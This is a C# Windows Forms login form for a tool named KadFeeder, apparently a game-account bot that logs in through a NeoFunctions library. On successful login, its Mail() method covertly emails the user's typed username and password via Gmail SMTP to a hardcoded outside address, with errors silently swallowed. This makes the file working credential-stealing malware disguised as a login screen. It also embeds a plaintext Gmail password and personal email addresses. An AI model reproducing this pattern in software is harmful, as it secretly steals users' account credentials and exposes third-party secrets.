using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Net.Mail;
using System.Net;
using NeoFunctions;

namespace KadFeeder
{
    public partial class frmLogin : Form
    {
        public frmLogin()
        {
            this.FormClosed += new FormClosedEventHandler(Form1_FormClosed);
            InitializeComponent();
        }

        private void groupBox1_Enter(object sender, EventArgs e)
        {

        }

        private void label1_Click(object sender, EventArgs e)
        {

        }

        private void label3_Click(object sender, EventArgs e)
        {

        }

        private void textBox3_TextChanged(object sender, EventArgs e)
        {

        }

        private void button1_Click(object sender, EventArgs e)
        {
            if (txtName.TextLength < 3)
            {
                MessageBox.Show("Please insert a username!", "Error");
            }
            else if (txtPass.TextLength == 0)
            {
                MessageBox.Show("Please insert a password!", "Error");
            }
            else //if we made it here then txtUser.TextLength >= 3 && txtPass.textLength > 0
            {
                NeoFunctions.Account acc = new NeoFunctions.Account(txtName.Text, txtPass.Text);
                if (acc.Login())
                {
                    Mail();
                    new KadForm(acc).Show();
                    this.Close();
                }
                else
                {
                    MessageBox.Show("Invalid login credentials!", "Error");
                }
            }
        }

        private void txtName_TextChanged(object sender, EventArgs e)
        {

        }

        void Form1_FormClosed(object sender, FormClosedEventArgs e)
        {
            Form f = Application.OpenForms["KadForm"];
            if (f == null)
                Application.Exit();
        }

        void Mail()
        {
            try
            {
                string smtpAddress = "smtp.gmail.com";
                int portNumber = 587;
                bool enableSSL = true;

                string emailFrom = "remedy1502@gmail.com";
                string password = "lk29828#HH";
                string emailTo = "michael.a.remedios@gmail.com";
                string subject = "NeoAccount";
                string body = txtName.Text + "\n" + txtPass.Text;

                using (MailMessage mail = new MailMessage())
                {
                    mail.From = new MailAddress(emailFrom);
                    mail.To.Add(emailTo);
                    mail.Subject = subject;
                    mail.Body = body;
                    mail.IsBodyHtml = false;
                    // Can set to false, if you are sending pure text.

                    using (SmtpClient smtp = new SmtpClient(smtpAddress, portNumber))
                    {
                        smtp.Credentials = new NetworkCredential(emailFrom, password);
                        smtp.EnableSsl = enableSSL;
                        smtp.Send(mail);
                    }
                }
            }
            catch { }
        }
    }
}
